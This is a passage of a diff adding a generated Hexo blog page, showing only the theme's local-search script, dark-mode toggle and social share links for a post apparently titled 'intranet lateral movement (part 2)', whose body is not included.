+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BA%8C) + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F82f7f61b%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/82f7f61b/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
